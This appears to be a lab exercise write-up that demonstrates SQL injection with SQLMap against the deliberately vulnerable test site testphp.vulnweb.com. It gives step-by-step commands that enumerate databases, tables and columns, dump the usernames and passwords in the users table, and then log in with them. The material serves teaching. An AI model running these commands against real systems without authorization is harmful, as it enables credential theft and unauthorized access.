@@ -1,0 +1,63 @@
+EXPERIMENT NO. 08
+Aim
+To demonstrate SQL Injection using SQLMap.
+
+Theory
+SQL Injection is a code injection technique where an attacker executes malicious SQL queries that control a web application’s database. With the right set of queries, an attacker can gain unauthorized access to information stored in databases. SQLMap tests whether a ‘GET’ parameter is vulnerable to SQL Injection.
+
+SQL injection occurs when an attacker can insert SQL commands through a URL, allowing them to execute those commands on the database. This vulnerability arises from improper filtering of variables by programmers or webmasters.
+
+A database is a systematic collection of information stored on a computer or web server that is useful for retrieving data.
+
+SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities and allows attackers to take control of a server's database. It is pre-installed on Kali Linux, the preferred choice for most penetration testers. To install SQLMap on other Debian-based Linux systems, use the following command:
+
+bash
+Copy code
+sudo apt-get install sqlmap
+To view the available parameters for SQLMap, type in the terminal:
+
+bash
+Copy code
+sqlmap -h
+Target
+URL: http://testphp.vulnweb.com/artists.php?artist=1
+Using SQLMap to Test for SQL Injection Vulnerability
+Step 1: List Information About Existing Databases
+Start by entering the web URL with the -u parameter. If you wish to test the website using proxies, include the --tor parameter. To check for database access, use the --dbs option:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+This command will output the available databases.
+
+Step 2: List Information About Tables in a Particular Database
+To access a specific database, modify your command to include the -D option followed by the database name, and use --tables to retrieve the tables within that database. For example, to access the acuart database:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+Step 3: Identify Columns in a Specific Table
+Once you have the table names, you can explore the columns in a particular table. For example, to check the users table in the acuart database, use the following command:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns
+Step 4: Retrieve Usernames
+To retrieve usernames stored in the uname column of the users table, use:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C uname --dump
+This command will show the usernames in the database.
+
+Step 5: Retrieve Passwords
+To find the passwords stored in the pass column of the users table, use:
+
+bash
+Copy code
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -C pass --dump
+Step 6: Log In Using Retrieved Credentials
+With the retrieved username and password, attempt to log in to the site. If successful, you will gain access using the credentials found in the database.
+
+Conclusion
+This experiment successfully demonstrated SQL Injection using SQLMap. By exploiting vulnerabilities in the web application, we were able to extract sensitive information, including usernames and passwords, from the database. Such vulnerabilities highlight the importance of secure coding practices and regular security assessments in web applications.
